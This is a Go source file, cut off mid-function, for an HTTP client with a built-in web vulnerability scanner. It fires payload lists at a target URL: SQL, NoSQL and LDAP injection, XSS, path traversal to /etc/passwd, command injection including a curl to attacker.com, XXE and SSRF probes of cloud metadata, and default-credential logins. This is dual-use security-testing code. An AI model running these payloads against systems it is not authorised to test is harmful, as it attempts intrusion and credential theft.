package main

import (
	"bytes"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"log"
	"mime/multipart"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"
)

type RequestConfig struct {
	Method      string
	URL         string
	Headers     map[string]string
	Body        string
	BodyFile    string
	FormData    map[string]string
	Files       map[string]string
	Timeout     int
	Verbose     bool
	OutputFile  string
	SecurityScan bool
	ScanType    string
}

func main() {
	config := RequestConfig{
		Headers:  make(map[string]string),
		FormData: make(map[string]string),
		Files:    make(map[string]string),
	}

	var headersRaw, formDataRaw, filesRaw string

	flag.StringVar(&config.Method, "X", "GET", "HTTP method (GET, POST, PUT, DELETE, PATCH, etc.)")
	flag.StringVar(&config.URL, "url", "", "Request URL (required)")
	flag.StringVar(&headersRaw, "H", "", "Headers (format: 'Key1:Value1,Key2:Value2')")
	flag.StringVar(&config.Body, "d", "", "Request body data")
	flag.StringVar(&config.BodyFile, "data-file", "", "File containing request body")
	flag.StringVar(&formDataRaw, "F", "", "Form data (format: 'key1=value1,key2=value2')")
	flag.StringVar(&filesRaw, "f", "", "Files to upload (format: 'field1=@/path/to/file1,field2=@/path/to/file2')")
	flag.IntVar(&config.Timeout, "timeout", 30, "Request timeout in seconds")
	flag.BoolVar(&config.Verbose, "v", false, "Verbose output")
	flag.StringVar(&config.OutputFile, "o", "", "Save response to file")
	flag.BoolVar(&config.SecurityScan, "scan", false, "Run security vulnerability scan")
	flag.StringVar(&config.ScanType, "scan-type", "all", "Scan type: sql, xss, path, header, cmd, xxe, ssrf, idor, nosql, ldap, cors, clickjack, ssl, info, auth, all")

	flag.Parse()

	if config.URL == "" {
		fmt.Println("Error: URL is required")
		flag.Usage()
		os.Exit(1)
	}

	// Parse headers
	if headersRaw != "" {
		parseKeyValue(headersRaw, config.Headers, ":")
	}

	// Parse form data
	if formDataRaw != "" {
		parseKeyValue(formDataRaw, config.FormData, "=")
	}

	// Parse files
	if filesRaw != "" {
		parseKeyValue(filesRaw, config.Files, "=")
	}

	// Run security scan if requested
	if config.SecurityScan {
		if err := runSecurityScan(config); err != nil {
			fmt.Fprintf(os.Stderr, "Security scan error: %v\n", err)
			os.Exit(1)
		}
		return
	}

	// Execute request
	if err := executeRequest(config); err != nil {
		fmt.Fprintf(os.Stderr, "Error: %v\n", err)
		os.Exit(1)
	}
}

func parseKeyValue(raw string, target map[string]string, sep string) {
	pairs := strings.Split(raw, ",")
	for _, pair := range pairs {
		parts := strings.SplitN(strings.TrimSpace(pair), sep, 2)
		if len(parts) == 2 {
			target[strings.TrimSpace(parts[0])] = strings.TrimSpace(parts[1])
		}
	}
}

func executeRequest(config RequestConfig) error {
	var body io.Reader
	var contentType string

	// Prepare request body
	if len(config.Files) > 0 || len(config.FormData) > 0 {
		// Multipart form data
		buf := &bytes.Buffer{}
		writer := multipart.NewWriter(buf)

		// Add form fields
		for key, val := range config.FormData {
			if err := writer.WriteField(key, val); err != nil {
				return fmt.Errorf("error writing form field: %w", err)
			}
		}

		// Add files
		for field, filepath := range config.Files {
			filepath = strings.TrimPrefix(filepath, "@")
			if err := addFileToMultipart(writer, field, filepath); err != nil {
				return err
			}
		}

		writer.Close()
		body = buf
		contentType = writer.FormDataContentType()
	} else if config.BodyFile != "" {
		// Read body from file
		data, err := os.ReadFile(config.BodyFile)
		if err != nil {
			return fmt.Errorf("error reading body file: %w", err)
		}
		body = bytes.NewReader(data)
	} else if config.Body != "" {
		// Use provided body
		body = strings.NewReader(config.Body)
	}

	// Create request
	req, err := http.NewRequest(config.Method, config.URL, body)
	if err != nil {
		return fmt.Errorf("error creating request: %w", err)
	}

	// Set content type for multipart
	if contentType != "" {
		req.Header.Set("Content-Type", contentType)
	}

	// Add custom headers
	for key, val := range config.Headers {
		req.Header.Set(key, val)
	}

	// Create client with timeout
	client := &http.Client{
		Timeout: time.Duration(config.Timeout) * time.Second,
	}

	// Verbose output
	if config.Verbose {
		printRequest(req)
	}

	// Execute request
	start := time.Now()
	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("error executing request: %w", err)
	}
	defer resp.Body.Close()
	duration := time.Since(start)

	// Read response
	respBody, err := io.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("error reading response: %w", err)
	}

	// Print response
	printResponse(resp, respBody, duration, config.Verbose)

	// Save to file if requested
	if config.OutputFile != "" {
		if err := os.WriteFile(config.OutputFile, respBody, 0644); err != nil {
			return fmt.Errorf("error writing to file: %w", err)
		}
		fmt.Printf("\n✓ Response saved to: %s\n", config.OutputFile)
	}

	return nil
}

func addFileToMultipart(writer *multipart.Writer, field, filepath string) error {
	file, err := os.Open(filepath)
	if err != nil {
		return fmt.Errorf("error opening file %s: %w", filepath, err)
	}
	defer file.Close()

	part, err := writer.CreateFormFile(field, filepath)
	if err != nil {
		return fmt.Errorf("error creating form file: %w", err)
	}

	_, err = io.Copy(part, file)
	if err != nil {
		return fmt.Errorf("error copying file: %w", err)
	}

	return nil
}

func printRequest(req *http.Request) {
	fmt.Println("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
	fmt.Printf("→ REQUEST\n")
	fmt.Println("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
	fmt.Printf("%s %s\n", req.Method, req.URL.String())
	fmt.Println("\nHeaders:")
	for key, values := range req.Header {
		for _, val := range values {
			fmt.Printf("  %s: %s\n", key, val)
		}
	}
	fmt.Println()
}

func printResponse(resp *http.Response, body []byte, duration time.Duration, verbose bool) {
	fmt.Println("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
	fmt.Printf("← RESPONSE\n")
	fmt.Println("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
	fmt.Printf("Status: %s\n", resp.Status)
	fmt.Printf("Time: %v\n", duration)

	if verbose {
		fmt.Println("\nHeaders:")
		for key, values := range resp.Header {
			for _, val := range values {
				fmt.Printf("  %s: %s\n", key, val)
			}
		}
	}

	fmt.Println("\nBody:")
	contentType := resp.Header.Get("Content-Type")
	if strings.Contains(contentType, "application/json") {
		var prettyJSON bytes.Buffer
		if err := json.Indent(&prettyJSON, body, "", "  "); err == nil {
			fmt.Println(prettyJSON.String())
		} else {
			fmt.Println(string(body))
		}
	} else {
		fmt.Println(string(body))
	}
}

// Security Testing Section

type VulnerabilityResult struct {
	TestName    string
	Payload     string
	Vulnerable  bool
	StatusCode  int
	Evidence    string
	Severity    string
}

var sqlInjectionPayloads = []string{
	"' OR '1'='1",
	"' OR '1'='1' --",
	"' OR '1'='1' /*",
	"admin' --",
	"admin' #",
	"admin'/*",
	"' or 1=1--",
	"' or 1=1#",
	"' or 1=1/*",
	"') or '1'='1--",
	"') or ('1'='1--",
	"1' UNION SELECT NULL--",
	"1' UNION SELECT NULL,NULL--",
	"' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'",
	"1' AND '1'='1",
	"1' AND '1'='2",
}

var xssPayloads = []string{
	"<script>alert('XSS')</script>",
	"<img src=x onerror=alert('XSS')>",
	"<svg/onload=alert('XSS')>",
	"javascript:alert('XSS')",
	"<iframe src=\"javascript:alert('XSS')\">",
	"<body onload=alert('XSS')>",
	"<input onfocus=alert('XSS') autofocus>",
	"\"><script>alert(String.fromCharCode(88,83,83))</script>",
	"';alert('XSS');//",
	"<script>alert(document.cookie)</script>",
}

var pathTraversalPayloads = []string{
	"../../../etc/passwd",
	"..\\..\\..\\windows\\system32\\config\\sam",
	"....//....//....//etc/passwd",
	"..%2F..%2F..%2Fetc%2Fpasswd",
	"..%252f..%252f..%252fetc%252fpasswd",
	"..//..//..//etc//passwd",
	"....\\....\\....\\windows\\system32\\config\\sam",
}

var commandInjectionPayloads = []string{
	"; ls -la",
	"| cat /etc/passwd",
	"& dir",
	"`whoami`",
	"$(whoami)",
	"; ping -c 10 127.0.0.1",
	"| sleep 10",
	"; curl attacker.com",
}

var headerInjectionPayloads = []string{
	"test\r\nX-Injected: true",
	"test\nX-Injected: true",
	"test\r\nSet-Cookie: session=evil",
	"test%0d%0aX-Injected: true",
}

var xxePayloads = []string{
	`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`,
	`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>`,
	`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>`,
	`<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "expect://id" >]><foo>&xxe;</foo>`,
}

var ssrfPayloads = []string{
	"http://localhost",
	"http://127.0.0.1",
	"http://0.0.0.0",
	"http://169.254.169.254/latest/meta-data/",
	"http://metadata.google.internal/computeMetadata/v1/",
	"http://[::1]",
	"http://2130706433", // 127.0.0.1 in decimal
	"http://localhost:22",
	"file:///etc/passwd",
	"dict://localhost:11211/stats",
}

var nosqlPayloads = []string{
	`{"$gt": ""}`,
	`{"$ne": null}`,
	`{"$regex": ".*"}`,
	`{"$where": "1==1"}`,
	`'; return true; var dummy='`,
	`' || '1'=='1`,
	`{"username": {"$ne": null}, "password": {"$ne": null}}`,
}

var ldapPayloads = []string{
	"*",
	"*)(&",
	"*)(uid=*))(|(uid=*",
	"admin)(&(password=*))",
	"*)(objectClass=*",
}

var idorTestIDs = []string{
	"1", "2", "100", "9999",
	"0", "-1",
	"admin", "test",
}

func runSecurityScan(config RequestConfig) error {
	fmt.Println("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
	fmt.Println("🔍 SECURITY VULNERABILITY SCAN")
	fmt.Println("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
	fmt.Printf("Target: %s\n", config.URL)
	fmt.Printf("Scan Type: %s\n\n", config.ScanType)

	results := []VulnerabilityResult{}

	if config.ScanType == "all" || config.ScanType == "sql" {
		fmt.Println("→ Testing SQL Injection vulnerabilities...")
		results = append(results, testSQLInjection(config)...)
	}

	if config.ScanType == "all" || config.ScanType == "xss" {
		fmt.Println("→ Testing XSS vulnerabilities...")
		results = append(results, testXSS(config)...)
	}

	if config.ScanType == "all" || config.ScanType == "path" {
		fmt.Println("→ Testing Path Traversal vulnerabilities...")
		results = append(results, testPathTraversal(config)...)
	}

	if config.ScanType == "all" || config.ScanType == "header" {
		fmt.Println("→ Testing Header Injection vulnerabilities...")
		results = append(results, testHeaderInjection(config)...)
	}

	if config.ScanType == "all" || config.ScanType == "cmd" {
		fmt.Println("→ Testing Command Injection vulnerabilities...")
		results = append(results, testCommandInjection(config)...)
	}

	if config.ScanType == "all" || config.ScanType == "xxe" {
		fmt.Println("→ Testing XXE (XML External Entity) vulnerabilities...")
		results = append(results, testXXE(config)...)
	}

	if config.ScanType == "all" || config.ScanType == "ssrf" {
		fmt.Println("→ Testing SSRF (Server-Side Request Forgery) vulnerabilities...")
		results = append(results, testSSRF(config)...)
	}

	if config.ScanType == "all" || config.ScanType == "idor" {
		fmt.Println("→ Testing IDOR (Insecure Direct Object Reference) vulnerabilities...")
		results = append(results, testIDOR(config)...)
	}

	if config.ScanType == "all" || config.ScanType == "nosql" {
		fmt.Println("→ Testing NoSQL Injection vulnerabilities...")
		results = append(results, testNoSQLInjection(config)...)
	}

	if config.ScanType == "all" || config.ScanType == "ldap" {
		fmt.Println("→ Testing LDAP Injection vulnerabilities...")
		results = append(results, testLDAPInjection(config)...)
	}

	if config.ScanType == "all" || config.ScanType == "cors" {
		fmt.Println("→ Testing CORS Misconfiguration...")
		results = append(results, testCORSMisconfiguration(config)...)
	}

	if config.ScanType == "all" || config.ScanType == "clickjack" {
		fmt.Println("→ Testing Clickjacking vulnerabilities...")
		results = append(results, testClickjacking(config)...)
	}

	if config.ScanType == "all" || config.ScanType == "ssl" {
		fmt.Println("→ Testing SSL/TLS configuration...")
		results = append(results, testSSLTLS(config)...)
	}

	if config.ScanType == "all" || config.ScanType == "info" {
		fmt.Println("→ Testing Information Disclosure...")
		results = append(results, testInformationDisclosure(config)...)
	}

	if config.ScanType == "all" || config.ScanType == "auth" {
		fmt.Println("→ Testing Authentication weaknesses...")
		results = append(results, testAuthenticationWeakness(config)...)
	}

	// Print results
	printSecurityResults(results)

	return nil
}

func testSQLInjection(config RequestConfig) []VulnerabilityResult {
	results := []VulnerabilityResult{}

	for _, payload := range sqlInjectionPayloads {
		result := testPayload(config, payload, "SQL Injection")
		results = append(results, result...)
		time.Sleep(100 * time.Millisecond) // Rate limiting
	}

	return results
}

func testXSS(config RequestConfig) []VulnerabilityResult {
	results := []VulnerabilityResult{}

	for _, payload := range xssPayloads {
		result := testPayload(config, payload, "XSS")
		results = append(results, result...)
		time.Sleep(100 * time.Millisecond)
	}

	return results
}

func testPathTraversal(config RequestConfig) []VulnerabilityResult {
	results := []VulnerabilityResult{}

	for _, payload := range pathTraversalPayloads {
		result := testPayload(config, payload, "Path Traversal")
		results = append(results, result...)
		time.Sleep(100 * time.Millisecond)
	}

	return results
}

func testCommandInjection(config RequestConfig) []VulnerabilityResult {
	results := []VulnerabilityResult{}

	for _, payload := range commandInjectionPayloads {
		result := testPayload(config, payload, "Command Injection")
		results = append(results, result...)
		time.Sleep(100 * time.Millisecond)
	}

	return results
}

func testHeaderInjection(config RequestConfig) []VulnerabilityResult {
	results := []VulnerabilityResult{}

	for _, payload := range headerInjectionPayloads {
		result := VulnerabilityResult{
			TestName: "Header Injection",
			Payload:  payload,
			Severity: "Medium",
		}

		// Test header injection
		testConfig := config
		testConfig.Headers["X-Test"] = payload

		req, err := http.NewRequest(testConfig.Method, testConfig.URL, nil)
		if err != nil {
			continue
		}

		for key, val := range testConfig.Headers {
			req.Header.Set(key, val)
		}

		client := &http.Client{Timeout: 5 * time.Second}
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		defer resp.Body.Close()

		body, _ := io.ReadAll(resp.Body)
		result.StatusCode = resp.StatusCode

		// Check if injected header appears in response
		if strings.Contains(string(body), "X-Injected") || 
		   resp.Header.Get("X-Injected") != "" {
			result.Vulnerable = true
			result.Evidence = "Injected header detected in response"
			result.Severity = "High"
		}

		results = append(results, result)
		time.Sleep(100 * time.Millisecond)
	}

	return results
}

func testPayload(config RequestConfig, payload, testType string) []VulnerabilityResult {
	results := []VulnerabilityResult{}

	// Test URL parameters
	parsedURL, err := url.Parse(config.URL)
	if err != nil {
		log.Printf("Error parsing URL: %v", err)
		return results
	}

	queryParams := parsedURL.Query()
	for param := range queryParams {
		originalValue := queryParams.Get(param)
		queryParams.Set(param, payload)
		parsedURL.RawQuery = queryParams.Encode()
		testURL := parsedURL.String()
		queryParams.Set(param, originalValue) // reset

		result := VulnerabilityResult{
			TestName: testType,
			Payload:  payload,
			Severity: "Medium",
		}

		var body io.Reader
		if config.Method == "POST" || config.Method == "PUT" {
			testData := fmt.Sprintf(`{"%s":"%s"}`, param, payload)
			body = strings.NewReader(testData)
		}

		req, err := http.NewRequest(config.Method, testURL, body)
		if err != nil {
			continue
		}

		for key, val := range config.Headers {
			req.Header.Set(key, val)
		}

		client := &http.Client{Timeout: 5 * time.Second}
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		defer resp.Body.Close()

		respBody, _ := io.ReadAll(resp.Body)
		result.StatusCode = resp.StatusCode

		bodyStr := string(respBody)
		bodyLower := strings.ToLower(bodyStr)

		switch testType {
		case "SQL Injection":
			sqlErrors := []string{
				"sql syntax", "mysql", "postgresql", "ora-", "sqlite",
				"syntax error", "unclosed quotation", "quoted string",
				"database error", "warning: mysql", "valid mysql result",
			}
			for _, errPattern := range sqlErrors {
				if strings.Contains(bodyLower, errPattern) {
					result.Vulnerable = true
					result.Evidence = fmt.Sprintf("SQL error detected in param '%s': %s", param, errPattern)
					result.Severity = "Critical"
					break
				}
			}

		case "XSS":
			if strings.Contains(bodyStr, payload) {
				result.Vulnerable = true
				result.Evidence = "Payload reflected in response without sanitization"
				result.Severity = "High"
			}

		case "Path Traversal":
			indicators := []string{"root:", "[boot loader]", "windows", "/etc/"}
			for _, indicator := range indicators {
				if strings.Contains(bodyLower, indicator) {
					result.Vulnerable = true
					result.Evidence = fmt.Sprintf("File content detected: %s", indicator)
					result.Severity = "Critical"
					break
				}
			}

		case "Command Injection":
			if len(bodyStr) > 1000 || strings.Contains(bodyStr, "uid=") ||
				strings.Contains(bodyStr, "root") || strings.Contains(bodyLower, "volume") {
				result.Vulnerable = true
				result.Evidence = "Possible command execution detected"
				result.Severity = "Critical"
			}
		}

		results = append(results, result)
	}

	return results
}

func testXXE(config RequestConfig) []VulnerabilityResult {
	results := []VulnerabilityResult{}

	for _, payload := range xxePayloads {
		result := VulnerabilityResult{
			TestName: "XXE (XML External Entity)",
			Payload:  payload,
			Severity: "Critical",
		}

		req, err := http.NewRequest("POST", config.URL, strings.NewReader(payload))
		if err != nil {
			continue
		}

		req.Header.Set("Content-Type", "application/xml")
		for key, val := range config.Headers {
			req.Header.Set(key, val)
		}

		client := &http.Client{Timeout: 5 * time.Second}
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		defer resp.Body.Close()

		body, _ := io.ReadAll(resp.Body)
		result.StatusCode = resp.StatusCode
		bodyStr := string(body)

		// Check for file content or entity expansion
		if strings.Contains(bodyStr, "root:") || 
		   strings.Contains(bodyStr, "[extensions]") ||
		   strings.Contains(bodyStr, "ami-id") {
			result.Vulnerable = true
			result.Evidence = "XXE payload processed - file content or metadata exposed"
		}

		results = append(results, result)
		time.Sleep(100 * time.Millisecond)
	}

	return results
}

func testSSRF(config RequestConfig) []VulnerabilityResult {
	results := []VulnerabilityResult{}

	for _, payload := range ssrfPayloads {
		result := VulnerabilityResult{
			TestName: "SSRF (Server-Side Request Forgery)",
			Payload:  payload,
			Severity: "Critical",
		}

		testURL := config.URL
		if strings.Contains(testURL, "?") {
			testURL += "&url=" + payload
		} else {
			testURL += "?url=" + payload
		}

		// Also test in body
		bodyData := fmt.Sprintf(`{"url":"%s","target":"%s"}`, payload, payload)
		
		req, err := http.NewRequest("POST", testURL, strings.NewReader(bodyData))
		if err != nil {
			continue
		}

		req.Header.Set("Content-Type", "application/json")
		for key, val := range config.Headers {
			req.Header.Set(key, val)
		}

		client := &http.Client{
			Timeout: 10 * time.Second,
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				return http.ErrUseLastResponse
			},
		}
		
		start := time.Now()
		resp, err := client.Do(req)
		duration := time.Since(start)
		
		if err != nil {
			// Timeout or connection might indicate SSRF attempt
			if duration > 5*time.Second {
				result.Vulnerable = true
				result.Evidence = "Request timeout suggests server attempted to reach internal resource"
			}
			results = append(results, result)
			continue
		}
		defer resp.Body.Close()

		body, _ := io.ReadAll(resp.Body)
		result.StatusCode = resp.StatusCode
		bodyStr := strings.ToLower(string(body))

		// Check for metadata or internal service responses
		if strings.Contains(bodyStr, "ami-id") || 
		   strings.Contains(bodyStr, "instance-id") ||
		   strings.Contains(bodyStr, "metadata") ||
		   strings.Contains(bodyStr, "internal") ||
		   resp.StatusCode == 200 && duration > 2*time.Second {
			result.Vulnerable = true
			result.Evidence = "Server accessed internal/metadata endpoint"
		}

		results = append(results, result)
		time.Sleep(100 * time.Millisecond)
	}

	return results
}

func testIDOR(config RequestConfig) []VulnerabilityResult {
	results := []VulnerabilityResult{}
	baselineResponse := ""
	baselineStatus := 0

	// Get baseline response
	req, err := http.NewRequest(config.Method, config.URL, nil)
	if err == nil {
		client := &http.Client{Timeout: 5 * time.Second}
		resp, err := client.Do(req)
		if err == nil {
			body, _ := io.ReadAll(resp.Body)
			baselineResponse = string(body)
			baselineStatus = resp.StatusCode
			resp.Body.Close()
		}
	}

	for _, id := range idorTestIDs {
		result := VulnerabilityResult{
			TestName: "IDOR (Insecure Direct Object Reference)",
			Payload:  id,
			Severity: "High",
		}

		testURL := config.URL
		if strings.Contains(testURL, "?") {
			testURL += "&id=" + id
		} else {
			testURL += "?id=" + id
		}

		req, err := http.NewRequest(config.Method, testURL, nil)
		if err != nil {
			continue
		}

		for key, val := range config.Headers {
			req.Header.Set(key, val)
		}

		client := &http.Client{Timeout: 5 * time.Second}
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		defer resp.Body.Close()

		body, _ := io.ReadAll(resp.Body)
		result.StatusCode = resp.StatusCode

		// Check if we get different data with different IDs
		if resp.StatusCode == 200 && resp.StatusCode != baselineStatus {
			result.Vulnerable = true
			result.Evidence = "Direct object reference accessible without proper authorization"
		} else if resp.StatusCode == 200 && string(body) != baselineResponse && len(body) > 0 {
			result.Vulnerable = true
			result.Evidence = "Different data returned for different IDs without auth check"
		}

		results = append(results, result)
		time.Sleep(100 * time.Millisecond)
	}

	return results
}

func testNoSQLInjection(config RequestConfig) []VulnerabilityResult {
	results := []VulnerabilityResult{}

	for _, payload := range nosqlPayloads {
		result := VulnerabilityResult{
			TestName: "NoSQL Injection",
			Payload:  payload,
			Severity: "Critical",
		}

		req, err := http.NewRequest("POST", config.URL, strings.NewReader(payload))
		if err != nil {
			continue
		}

		req.Header.Set("Content-Type", "application/json")
		for key, val := range config.Headers {
			req.Header.Set(key, val)
		}

		client := &http.Client{Timeout: 5 * time.Second}
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		defer resp.Body.Close()

		body, _ := io.ReadAll(resp.Body)
		result.StatusCode = resp.StatusCode
		bodyStr := strings.ToLower(string(body))

		// Check for NoSQL errors or successful bypass
		if strings.Contains(bodyStr, "mongodb") ||
		   strings.Contains(bodyStr, "mongoose") ||
		   strings.Contains(bodyStr, "unauthorized") && resp.StatusCode == 200 ||
		   strings.Contains(bodyStr, "logged in") ||
		   strings.Contains(bodyStr, "success") && resp.StatusCode == 200 {
			result.Vulnerable = true
			result.Evidence = "NoSQL query manipulation detected"
		}

		results = append(results, result)
		time.Sleep(100 * time.Millisecond)
	}

	return results
}

func testLDAPInjection(config RequestConfig) []VulnerabilityResult {
	results := []VulnerabilityResult{}

	for _, payload := range ldapPayloads {
		result := VulnerabilityResult{
			TestName: "LDAP Injection",
			Payload:  payload,
			Severity: "High",
		}

		testURL := config.URL
		if strings.Contains(testURL, "?") {
			testURL += "&username=" + payload
		} else {
			testURL += "?username=" + payload
		}

		req, err := http.NewRequest(config.Method, testURL, nil)
		if err != nil {
			continue
		}

		for key, val := range config.Headers {
			req.Header.Set(key, val)
		}

		client := &http.Client{Timeout: 5 * time.Second}
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		defer resp.Body.Close()

		body, _ := io.ReadAll(resp.Body)
		result.StatusCode = resp.StatusCode
		bodyStr := strings.ToLower(string(body))

		// Check for LDAP errors or excessive data return
		if strings.Contains(bodyStr, "ldap") ||
		   strings.Contains(bodyStr, "directory") ||
		   (resp.StatusCode == 200 && len(body) > 5000) {
			result.Vulnerable = true
			result.Evidence = "LDAP query manipulation possible"
		}

		results = append(results, result)
		time.Sleep(100 * time.Millisecond)
	}

	return results
}

func testCORSMisconfiguration(config RequestConfig) []VulnerabilityResult {
	results := []VulnerabilityResult{}
	
	testOrigins := []string{
		"https://evil.com",
		"null",
		"https://attacker.com",
	}

	for _, origin := range testOrigins {
		result := VulnerabilityResult{
			TestName: "CORS Misconfiguration",
			Payload:  origin,
			Severity: "Medium",
		}

		req, err := http.NewRequest(config.Method, config.URL, nil)
		if err != nil {
			continue
		}

		req.Header.Set("Origin", origin)
		for key, val := range config.Headers {
			req.Header.Set(key, val)
		}

		client := &http.Client{Timeout: 5 * time.Second}
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		defer resp.Body.Close()

		result.StatusCode = resp.StatusCode

		// Check CORS headers
		acao := resp.Header.Get("Access-Control-Allow-Origin")
		acac := resp.Header.Get("Access-Control-Allow-Credentials")

		if acao == origin || acao == "*" {
			if acac == "true" && acao != "*" {
				result.Vulnerable = true
				result.Evidence = fmt.Sprintf("CORS allows credentials from untrusted origin: %s", origin)
				result.Severity = "High"
			} else if acao == "*" {
				result.Vulnerable = true
				result.Evidence = "CORS allows all origins (*)"
			} else {
				result.Vulnerable = true
				result.Evidence = fmt.Sprintf("CORS reflects arbitrary origin: %s", origin)
			}
		}

		results = append(results, result)
		time.Sleep(100 * time.Millisecond)
	}

	return results
}

func testClickjacking(config RequestConfig) []VulnerabilityResult {
	result := VulnerabilityResult{
		TestName: "Clickjacking",
		Payload:  "N/A",
		Severity: "Medium",
	}

	req, err := http.NewRequest("GET", config.URL, nil)
	if err != nil {
		return []VulnerabilityResult{result}
	}

	for key, val := range config.Headers {
		req.Header.Set(key, val)
	}

	client := &http.Client{Timeout: 5 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return []VulnerabilityResult{result}
	}
	defer resp.Body.Close()

	result.StatusCode = resp.StatusCode

	// Check for X-Frame-Options or CSP frame-ancestors
	xfo := resp.Header.Get("X-Frame-Options")
	csp := resp.Header.Get("Content-Security-Policy")

	if xfo == "" && !strings.Contains(csp, "frame-ancestors") {
		result.Vulnerable = true
		result.Evidence = "Missing X-Frame-Options and CSP frame-ancestors headers"
	}

	return []VulnerabilityResult{result}
}

func testSSLTLS(config RequestConfig) []VulnerabilityResult {
	result := VulnerabilityResult{
		TestName: "SSL/TLS Configuration",
		Payload:  "N/A",
		Severity: "Medium",
	}

	if !strings.HasPrefix(config.URL, "https://") {
		result.Vulnerable = true
		result.Evidence = "Site not using HTTPS"
		result.Severity = "High"
		return []VulnerabilityResult{result}
	}

	req, err := http.NewRequest("GET", config.URL, nil)
	if err != nil {
		return []VulnerabilityResult{result}
	}

	client := &http.Client{Timeout: 5 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return []VulnerabilityResult{result}
	}
	defer resp.Body.Close()

	result.StatusCode = resp.StatusCode

	// Check HSTS header
	hsts := resp.Header.Get("Strict-Transport-Security")
	if hsts == "" {
		result.Vulnerable = true
		result.Evidence = "Missing HSTS (Strict-Transport-Security) header"
	}

	return []VulnerabilityResult{result}
}

func testInformationDisclosure(config RequestConfig) []VulnerabilityResult {
	results := []VulnerabilityResult{}

	req, err := http.NewRequest("GET", config.URL, nil)
	if err != nil {
		return results
	}

	for key, val := range config.Headers {
		req.Header.Set(key, val)
	}

	client := &http.Client{Timeout: 5 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return results
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	bodyStr := strings.ToLower(string(body))

	// Check for sensitive headers
	sensitiveHeaders := map[string]string{
		"Server":           resp.Header.Get("Server"),
		"X-Powered-By":     resp.Header.Get("X-Powered-By"),
		"X-AspNet-Version": resp.Header.Get("X-AspNet-Version"),
	}

	for header, value := range sensitiveHeaders {
		if value != "" {
			result := VulnerabilityResult{
				TestName:    "Information Disclosure",
				Payload:     header,
				Vulnerable:  true,
				StatusCode:  resp.StatusCode,
				Evidence:    fmt.Sprintf("Server exposes %s: %s", header, value),
				Severity:    "Low",
			}
			results = append(results, result)
		}
	}

	// Check for debug/error info in response
	debugIndicators := []string{"stack trace", "exception", "debug", "error at line", "warning:", "traceback"}
	for _, indicator := range debugIndicators {
		if strings.Contains(bodyStr, indicator) {
			result := VulnerabilityResult{
				TestName:    "Information Disclosure",
				Payload:     "Error Messages",
				Vulnerable:  true,
				StatusCode:  resp.StatusCode,
				Evidence:    fmt.Sprintf("Response contains debug/error information: %s", indicator),
				Severity:    "Low",
			}
			results = append(results, result)
			break
		}
	}

	return results
}

func testAuthenticationWeakness(config RequestConfig) []VulnerabilityResult {
	results := []VulnerabilityResult{}

	// Test 1: Missing authentication
	req, err := http.NewRequest(config.Method, config.URL, nil)
	if err != nil {
		return results
	}

	client := &http.Client{Timeout: 5 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return results
	}
	defer resp.Body.Close()

	if resp.StatusCode == 200 {
		result := VulnerabilityResult{
			TestName:    "Authentication Weakness",
			Payload:     "No credentials",
			Vulnerable:  true,
			StatusCode:  resp.StatusCode,
			Evidence:    "Endpoint accessible without authentication",
			Severity:    "High",
		}
		results = append(results, result)
	}

	// Test 2: Weak credentials
	weakCreds := []struct {
		user string
		pass string
	}{
		{"admin", "admin"},
		{"admin", "password"},
		{"admin", "123456"},
		{"root", "root"},
		{"test", "test"},
	}

	for _, cred := range weakCreds {
		req, err := http.NewRequest(config.Method, config.URL, nil)
		if err != nil {
			continue
		}

		req.SetBasicAuth(cred.user, cred.pass)
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		defer resp.Body.Close()

		if resp.StatusCode == 200 || resp.StatusCode == 301 || resp.StatusCode == 302 {
			result := VulnerabilityResult{
				TestName:    "Authentication Weakness",
				Payload:     fmt.Sprintf("%s:%s", cred.user, cred.pass),
				Vulnerable:  true,
				StatusCode:  resp.StatusCode,
				Evidence:    "Weak/default credentials accepted",
				Severity:    "Critical",
			}
			results = append(results, result)
		}

		time.Sleep(100 * time.Millisecond)
	}

	return results
}

func printSecurityResults(results []VulnerabilityResult) {
	fmt.Println("\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
	fmt.Println("📊 SCAN RESULTS")
	fmt.Println("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

	vulnerableCount := 0
	criticalCount := 0
	highCount := 0

	for _, result := range results {
		if result.Vulnerable {
			vulnerableCount++
			
			severityIcon := "⚠️"
			if result.Severity == "Critical" {
				criticalCount++
				severityIcon = "🔴"
			} else if result.Severity == "High" {
				highCount++
				severityIcon = "🟠"
			}

			fmt.Printf("\n%s [%s] %s\n", severityIcon, result.Severity, result.TestName)
			fmt.Printf("   Payload: %s\n", result.Payload)
